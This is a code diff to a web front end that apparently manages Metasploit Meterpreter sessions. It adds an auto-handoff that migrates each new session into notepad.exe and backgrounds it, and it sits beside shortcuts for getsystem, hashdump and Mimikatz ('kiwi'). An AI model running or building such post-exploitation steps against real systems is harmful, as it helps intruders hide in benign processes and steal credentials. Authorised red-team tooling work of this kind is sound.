@@ -3,13 +3,17 @@
 
   // ── Per-session state ────────────────────────────────────────────────────────
   const SHELL_STATE = {
-    sessions:   [],
-    active_sid: null,
-    buffers:    {},
-    history:    {},
-    histIdx:    {},
-    histDraft:  {},
-    polling:    false,
+    sessions:        [],
+    active_sid:      null,
+    buffers:         {},
+    history:         {},
+    histIdx:         {},
+    histDraft:       {},
+    polling:         false,
+    handoffDone:     {},    // sid → true once post-connect steps ran
+    closing:         new Set(),  // sids being killed — hide until RPC confirms
+    _prevSessionIds: [],
+    handoffBannerSid: null,
   };
 
   const SHORTCUTS = {
@@ -17,6 +21,7 @@
       {label: 'sysinfo',    cmd: 'sysinfo'},
       {label: 'getuid',     cmd: 'getuid'},
       {label: 'getsystem',  cmd: 'getsystem'},
+      {label: 'migrate',    cmd: 'migrate -n notepad.exe'},
       {label: 'ps',         cmd: 'ps'},
       {label: 'hashdump',   cmd: 'hashdump',  cls: 'creds'},
       {label: 'kiwi',       cmd: 'load kiwi', cls: 'creds'},
@@ -43,6 +48,154 @@
       {label: 'ipconfig',   cmd: 'ipconfig /all'},
     ],
   };
+
+  function _sessionStype(s) {
+    const t = (s.type || '').toLowerCase();
+    return t.includes('meter') ? 'meterpreter' : (t || 'shell');
+  }
+
+  function isAutoHandoffEnabled() {
+    const stored = localStorage.getItem('h3x_autohandoff');
+    if (stored === '0') return false;
+    if (stored === '1') return true;
+    const el = document.querySelector('.h3x-autohandoff-cb');
+    return el ? el.checked : true;
+  }
+
+  function setAutoHandoff(on) {
+    localStorage.setItem('h3x_autohandoff', on ? '1' : '0');
+    document.querySelectorAll('.h3x-autohandoff-cb').forEach(el => {
+      el.checked = on;
+    });
+  }
+
+  function _syncAutohandoffCheckboxes() {
+    const stored = localStorage.getItem('h3x_autohandoff');
+    if (stored === null) return;
+    const on = stored === '1';
+    document.querySelectorAll('.h3x-autohandoff-cb').forEach(el => {
+      el.checked = on;
+    });
+  }
+
+  function _clearShellArea() {
+    const tabs = document.getElementById('session-tabs');
+    const bank = document.getElementById('shortcut-bank');
+    const term = document.getElementById('shell-term');
+    const input = document.getElementById('cmd-input');
+    const active = document.getElementById('active-shell');
+    const empty = document.getElementById('no-sessions');
+    if (tabs) tabs.innerHTML = '';
+    if (bank) bank.innerHTML = '';
+    if (term) term.textContent = '';
+    if (input) input.value = '';
+    hideHandoffBanner();
+    if (active) active.style.display = 'none';
+    if (empty) empty.style.display = '';
+  }
+
+  function showHandoffBanner(sid) {
+    sid = String(sid);
+    SHELL_STATE.handoffBannerSid = sid;
+    const banner = document.getElementById('handoff-banner');
+    const sub = document.getElementById('handoff-banner-sub');
+    if (!banner) return;
+    const s = SHELL_STATE.sessions.find(x => String(x.id) === sid);
+    const stype = s ? _sessionStype(s) : 'session';
+    if (sub && s) {
+      sub.textContent = stype === 'meterpreter'
+        ? `[${sid}] ${s.target || '?'} — migrate → elevate → hashdump → background`
+        : `[${sid}] ${stype} session — run recon shortcuts; no migrate available`;
+    }
+    banner.classList.add('visible');
+  }
+
+  function hideHandoffBanner() {
+    SHELL_STATE.handoffBannerSid = null;
+    const banner = document.getElementById('handoff-banner');
+    if (banner) banner.classList.remove('visible');
+  }
+
+  function dismissHandoffBanner() {
+    const sid = SHELL_STATE.handoffBannerSid || SHELL_STATE.active_sid;
+    if (sid) SHELL_STATE.handoffDone[String(sid)] = true;
+    hideHandoffBanner();
+  }
+
+  function runCmdOnSession(sid, cmd, timeout) {
+    timeout = timeout || 15;
+    return fetch(`/api/msf/session/${sid}/run`, {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({command: cmd, timeout}),
+    }).then(r => r.json());
+  }
+
+  function _applyCmdResult(sid, cmd, d) {
+    if (d.status === 'ok') {
+      appendBuffer(sid, (d.output || '') + '\n', 'stdout');
+    } else if (d.session_dead) {
+      appendBuffer(sid, '[SESSION DIED] ' + (d.message || '') + '\n', 'stderr');
+      SHELL_STATE.closing.add(String(sid));
+      _dropSessionLocally(sid);
+      return false;
+    } else {
+      appendBuffer(sid, '[ERROR] ' + (d.message || 'unknown') + '\n', 'stderr');
+    }
+    renderTerm();
+    return true;
+  }
+
+  function runHandoffStep(cmd) {
+    const sid = SHELL_STATE.active_sid;
+    if (!sid) return;
+    appendBuffer(sid, '\n[handoff] $ ' + cmd + '\n', 'echo');
+    renderTerm();
+    runCmdOnSession(sid, cmd, 20).then(d => _applyCmdResult(sid, cmd, d));
+  }
+
+  function runAutoHandoff(sid) {
+    sid = String(sid);
+    if (SHELL_STATE.handoffDone[sid] || !isAutoHandoffEnabled()) return;
+    const s = SHELL_STATE.sessions.find(x => String(x.id) === sid);
+    if (!s || _sessionStype(s) !== 'meterpreter') {
+      SHELL_STATE.handoffDone[sid] = true;
+      return;
+    }
+    SHELL_STATE.handoffDone[sid] = 'running';
+    selectSession(sid);
+    showHandoffBanner(sid);
+    appendBuffer(sid, '\n[auto-handoff] migrate → notepad.exe, then background...\n', 'meta');
+    renderTerm();
+
+    runCmdOnSession(sid, 'migrate -n notepad.exe', 25)
+      .then(d => {
+        if (!_applyCmdResult(sid, 'migrate', d)) return null;
+        return runCmdOnSession(sid, 'background', 12);
+      })
+      .then(d => {
+        if (!d) return;
+        _applyCmdResult(sid, 'background', d);
+        appendBuffer(sid, '[auto-handoff] complete — session hardened\n', 'echo');
+        renderTerm();
+        SHELL_STATE.handoffDone[sid] = true;
+      })
+      .catch(() => {
+        appendBuffer(sid, '[auto-handoff] failed — use banner buttons manually\n', 'stderr');
+        renderTerm();
+        delete SHELL_STATE.handoffDone[sid];
+      });
+  }
+
+  function _onNewSessions(fresh) {
+    for (const s of fresh) {
+      const sid = String(s.id);
+      showHandoffBanner(sid);
+      if (isAutoHandoffEnabled() && _sessionStype(s) === 'meterpreter') {
+        runAutoHandoff(sid);
+      }
+    }
+  }
 
   function focusShellPanel(sid) {
     const panel = document.getElementById('shell-panel');
@@ -96,11 +249,15 @@
   function _dropSessionLocally(sid) {
     sid = String(sid);
     SHELL_STATE.sessions = SHELL_STATE.sessions.filter(s => String(s.id) !== sid);
+    SHELL_STATE._prevSessionIds = SHELL_STATE._prevSessionIds.filter(id => id !== sid);
     delete SHELL_STATE.buffers[sid];
     delete SHELL_STATE.history[sid];
     delete SHELL_STATE.histIdx[sid];
     delete SHELL_STATE.histDraft[sid];
+    delete SHELL_STATE.handoffDone[sid];
     sessionStorage.removeItem('shell_hist_' + sid);
+
+    if (String(SHELL_STATE.handoffBannerSid) === sid) hideHandoffBanner();
 
     const input = document.getElementById('cmd-input');
     if (SHELL_STATE.active_sid === sid) {
@@ -120,13 +277,7 @@
     }
 
     if (!SHELL_STATE.sessions.length) {
-      const empty = document.getElementById('no-sessions');
-      const active = document.getElementById('active-shell');
-      if (empty) empty.style.display = '';
-      if (active) active.style.display = 'none';
-      const term = document.getElementById('shell-term');
-      if (term) term.innerHTML = '';
-      if (input) input.value = '';
+      _clearShellArea();
     } else {
       const empty = document.getElementById('no-sessions');
       const active = document.getElementById('active-shell');
@@ -147,42 +298,60 @@
     }
     if (!confirm(`Kill all ${n} MSF session(s)? This cannot be undone.`)) return;
 
+    SHELL_STATE.sessions.forEach(s => SHELL_STATE.closing.add(String(s.id)));
+    SHELL_STATE.sessions = [];
+    SHELL_STATE.active_sid = null;
+    SHELL_STATE._prevSessionIds = [];
+    SHELL_STATE.handoffDone = {};
+    const url = new URL(location);
+    url.searchParams.delete('sid');
+    history.replaceState(null, '', url.pathname + url.search + url.hash);
+    const summary = document.getElementById('session-summary');
+    if (summary) summary.textContent = '';
+    _clearShellArea();
+    syncSessionStrip();
+
     fetch('/api/msf/sessions/kill-all', {method: 'POST'})
       .then(r => r.json())
       .then(d => {
-        const killed = d.killed || [];
+        const killed = (d.killed || []).map(String);
         const failed = d.failed || [];
         killed.forEach(sid => {
+          SHELL_STATE.closing.delete(sid);
           delete SHELL_STATE.buffers[sid];
           delete SHELL_STATE.history[sid];
           delete SHELL_STATE.histIdx[sid];
           delete SHELL_STATE.histDraft[sid];
           sessionStorage.removeItem('shell_hist_' + sid);
         });
-        SHELL_STATE.sessions = [];
-        SHELL_STATE.active_sid = null;
-        const url = new URL(location);
-        url.searchParams.delete('sid');
-        history.replaceState(null, '', url.pathname + url.search + url.hash);
-        const empty = document.getElementById('no-sessions');
-        const active = document.getElementById('active-shell');
-        if (empty) empty.style.display = '';
-        if (active) active.style.display = 'none';
-        const input = document.getElementById('cmd-input');
-        if (input) input.value = '';
-        syncSessionStrip();
         refreshSessions(true);
         if (failed.length) {
           alert(`Killed ${killed.length}; ${failed.length} failed:\n` +
                 failed.map(f => `  [${f.id}] ${f.message}`).join('\n'));
         }
       })
-      .catch(() => alert('Failed to reach MSF RPC — is msfrpcd running?'));
+      .catch(() => {
+        alert('Failed to reach MSF RPC — is msfrpcd running?');
+        SHELL_STATE.closing.clear();
+        refreshSessions(true);
+      });
   }
 
   function refreshSessions(force) {
     return fetch('/api/msf/sessions').then(r => r.json()).then(d => {
-      const sessions = d.sessions || [];
+      let sessions = (d.sessions || []).filter(
+        s => !SHELL_STATE.closing.has(String(s.id))
+      );
+
+      // Drop closing markers for sessions confirmed gone from RPC
+      const liveIds = new Set((d.sessions || []).map(s => String(s.id)));
+      for (const sid of [...SHELL_STATE.closing]) {
+        if (!liveIds.has(sid)) SHELL_STATE.closing.delete(sid);
+      }
+
+      const prevIds = new Set(SHELL_STATE._prevSessionIds || []);
+      const fresh = sessions.filter(s => !prevIds.has(String(s.id)));
+
       SHELL_STATE.sessions = sessions;
       const summary = document.getElementById('session-summary');
       if (summary) {
@@ -190,13 +359,12 @@
       }
 
       if (!sessions.length) {
-        const empty = document.getElementById('no-sessions');
-        const active = document.getElementById('active-shell');
-        if (empty) empty.style.display = '';
-        if (active) active.style.display = 'none';
+        SHELL_STATE.active_sid = null;
+        _clearShellArea();
         syncSessionStrip();
         return;
       }
+
       const empty = document.getElementById('no-sessions');
       const active = document.getElementById('active-shell');
       if (empty) empty.style.display = 'none';
@@ -209,6 +377,10 @@
                   !sessions.some(s => String(s.id) === String(SHELL_STATE.active_sid))) {
         SHELL_STATE.active_sid = String(sessions[0].id);
       }
+
+      SHELL_STATE._prevSessionIds = sessions.map(s => String(s.id));
+      if (fresh.length) _onNewSessions(fresh);
+
       renderTabs();
       renderShortcuts();
       renderTerm();
@@ -219,6 +391,10 @@
   function renderTabs() {
     const tabs = document.getElementById('session-tabs');
     if (!tabs) return;
+    if (!SHELL_STATE.sessions.length) {
+      tabs.innerHTML = '';
+      return;
+    }
     tabs.innerHTML = SHELL_STATE.sessions.map(s => {
       const sid    = String(s.id);
       const stype  = (s.type || '').toLowerCase().includes('meter') ? 'meterpreter'
@@ -242,12 +418,13 @@
     sid = String(sid);
     if (!confirm(`Close session ${sid}? This stops it in Metasploit.`)) return;
 
-    // Drop from tabs, terminal, command field, and session strip immediately.
+    SHELL_STATE.closing.add(sid);
     _dropSessionLocally(sid);
 
     fetch(`/api/msf/session/${sid}/kill`, {method: 'POST'})
       .then(r => r.json())
       .then(d => {
+        SHELL_STATE.closing.delete(sid);
         refreshSessions(true);
         if (d.status !== 'ok') {
           alert('Could not close session ' + sid + ': ' +
@@ -255,6 +432,7 @@
         }
       })
       .catch(() => {
+        SHELL_STATE.closing.delete(sid);
         alert('Failed to reach MSF RPC — is msfrpcd running?');
         refreshSessions(true);
       });
@@ -420,6 +598,7 @@
   }
 
   document.addEventListener('DOMContentLoaded', () => {
+    _syncAutohandoffCheckboxes();
     refreshSessions().then(() => {
       pollLoop();
       const urlSid = new URLSearchParams(location.search).get('sid');
